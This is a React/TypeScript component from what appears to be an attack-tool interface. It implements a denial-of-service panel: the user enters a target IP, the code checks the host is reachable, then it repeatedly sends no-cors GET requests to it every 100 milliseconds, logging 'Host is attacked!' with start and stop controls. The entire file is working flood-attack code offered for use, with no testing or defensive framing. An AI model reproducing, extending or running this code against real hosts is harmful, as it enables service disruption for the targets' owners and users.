import { FC, useEffect, useState } from 'react'
import AttackParamsWrapper from '@/hoc/attack-params-wrapper/AttackParamsWrapper'
import AttackTrigger from '@/components/ui/triggers/attack-trigger/AttackTrigger'
import { Icon, Input, Text, Alert, AlertIcon, useToast } from '@chakra-ui/react'
import { BiSolidRightArrow } from 'react-icons/bi'
import { IoStop } from 'react-icons/io5'
import IconTooltipBtn from '@/components/ui/buttons/icon-tooltip-btn/IconTooltipBtn'
import { useActions } from '@/hooks/useActions/useActions'
import makeReq from '@/utils/makeReq'
import { useSelector } from 'react-redux'
import { GoPaperclip } from 'react-icons/go'
import { RootState } from '@/store'
import { useNavigate } from "react-router-dom";

const DOSParams : FC = () => {
    const toast = useToast()
    const { updateLogs, setAttackSwitcher } = useActions()
    const { attackSwitcher } = useSelector((state:RootState) => state )

    const [ipAddress, setIPAddress] = useState('')
    const [ipAddressError, setIPAdressError] = useState(false)

    const [doDosAttack, setDoDosAttack] = useState(false)
    const [attackInst, setAttackInst] = useState<Generator<undefined, void, unknown> | null>(null)
    const [attackInterval, setAttackInterval] = useState<NodeJS.Timeout>()
    const [reqOk, setReqOk] = useState(true)
    const [blockBtn, setBlockBtn] = useState(false)
    
    const navigate = useNavigate();
    const { resetLogs, lastIsLoaded } = useActions()

    //TODO:
    // const [reqBody, setReqBody] = useState('')
    // const [reqBodyError, setReqBodyError] = useState(false)

    const checkIPAddress = () => {
        setBlockBtn(true)
        updateLogs({ type: 'info', time: Date.now(), ctx: 'Process initialization. Validation of input data..', isLoaded: true })

        if(!ipAddress.length) {
            updateLogs({ type: 'error', time: Date.now(), ctx: 'IP address not specified!', isLoaded: true })
            setIPAdressError(true)
            setBlockBtn(false)
            return false
        }

        setTimeout(() => checkHost(), 1500)
    }

    const checkHost = async () => {
        updateLogs({ type: 'info', time: Date.now(), ctx: 'Checking ip address..', isLoaded: false })
        // check host
        try {
            const addressRes = await makeReq(ipAddress)
            if(addressRes){
                lastIsLoaded()
                updateLogs({ type: 'info', time: Date.now(), ctx: 'IP address verification completed, host is accessible', isLoaded: true })
                
                setTimeout(() => checkReqData(), 500)
            }
        } catch (error) {
            lastIsLoaded()
            updateLogs({ type: 'error', time: Date.now(), ctx: 'Unable to check IP address', isLoaded: true })
            updateLogs({ type: 'error', time: Date.now(), ctx: error!.toString(), isLoaded: true })
            setIPAdressError(true)
            setBlockBtn(false)
            return false
        }
    }

    // TODO: GENERATOR вместо worker

    const checkReqData = () => {
        updateLogs({ type: 'info', time: Date.now(), ctx: 'Attack started!', isLoaded: true })
        setTimeout(() => {
            startAttack()
            setBlockBtn(false)
        }, 500)
    }

    const startAttack = () => {
        function* attackGenerator(url:string) {
            if(!reqOk) throw new Error('error')

            while(true) {
                try {
                    fetch(url, {
                        method: 'GET',
                        mode: 'no-cors',
                        credentials: "same-origin"
                    })
                } catch (error) {
                    setReqOk(false)
                    console.log(error)
                    throw new Error('error')
                    return
                }                
                
                    if(reqOk) yield
                    else throw new Error('error')
            }
        }

        setAttackSwitcher()
        setDoDosAttack(true)
        const attack = attackGenerator(ipAddress)
        setIPAdressError(false)
        setAttackInst(attack)
    }

    const stopAttack = () => {
        console.log('try to stop..');
        if(doDosAttack || reqOk) {
            console.log('stop!');
            
            updateLogs({ type: 'error', time: Date.now(), ctx: 'Attack stopped!', isLoaded: true })
            if(attackSwitcher.value) setAttackSwitcher()
            setDoDosAttack(false)
            setAttackInst(null)
            clearInterval(attackInterval)
        }
    }

    const exit = () => {
        stopAttack()
        resetLogs()
        navigate('/')
    }

    useEffect(()=>{
        if(ipAddress.length && ipAddressError){
            setIPAdressError(false)
        }
    }, [ipAddress])

    useEffect(()=>{
        if(doDosAttack){
            const int = setInterval(async ()=>{
            try {
                // updateLogs({ type: 'info', time: Date.now(), ctx: JSON.stringify(attackInst), isLoaded: true })
                if(reqOk){
                    if(attackInst){
                        try {
                            attackInst.next(ipAddress)
                            // .then(()=>{
                                updateLogs({ type: 'success', time: Date.now(), ctx: 'Host is attacked!', isLoaded: true })
                            // })
                        } catch {
                            updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Error when call iterator', isLoaded: true })
                            stopAttack()
                        }
                    } 
                }
            } catch {
                updateLogs({ type: 'fatal-error', time: Date.now(), ctx: 'Server is not responding!', isLoaded: true  })
                stopAttack()
                setIPAdressError(true)
            }
        }, 100)
        setAttackInterval(int)
        }
    }, [doDosAttack])
    
    return(
        <AttackParamsWrapper handleClick={exit}>
            <AttackTrigger title='DoS' img='dos' />

            <div className='w-[400px] flex flex-col gap-3'>
                <div className='flex items-center gap-2'>
                    <Input
                    placeholder='Write down the ip address'
                    backgroundColor='var(--form-color)'
                    border='hidden'
                    size='sm'
                    color='#fff'
                    value={ipAddress}
                    onChange={(event)=> setIPAddress(event.target.value)}
                    isInvalid={ipAddressError}
                    isDisabled={attackSwitcher.value}
                    />

                    {
                        !attackSwitcher.value && (
                            <IconTooltipBtn
                            label='Start'
                            icon={BiSolidRightArrow}
                            size='xs'
                            iColor='var(--main-color)'
                            clickHandler={() => checkIPAddress()}
                            isDisabled={blockBtn}
                            />
                        ) || (
                            <IconTooltipBtn
                            label='Stop'
                            icon={IoStop}
                            size='xs'
                            iColor='var(--red-color)'
                            clickHandler={() => stopAttack()}
                            isDisabled={blockBtn}
                            />
                            )
                    }
                </div>

                <div className='relative'>
                    <Text className='absolute z-10 top-[6px] left-[12px] hover:cursor-pointer' fontSize='small' color='#9ca3af'>Upload JSON file with req body</Text>
                    <Icon className='absolute z-10 top-[7px] right-[8px] hover:cursor-pointer' as={GoPaperclip} fontSize='18px' color='#9ca3af' />
                    <Input
                    backgroundColor='var(--form-color)'
                    border='hidden'
                    size='sm'
                    color='#fff'
                    type='file'
                    className='file:mt-[50px] hover:cursor-pointer'
                    isDisabled={attackSwitcher.value}
                    onClick={(event) => {
                        event.preventDefault()
                        toast({
                        position: 'bottom-left',
                        render: () => (
                            <Alert status='info' variant='top-accent' height='35px'>
                                <AlertIcon />
                                Coming soon! (in v. 1.1)
                            </Alert>
                        ),
                        })
                    }}
                    />
                </div>
            </div>
        </AttackParamsWrapper>
    )
}

export default DOSParams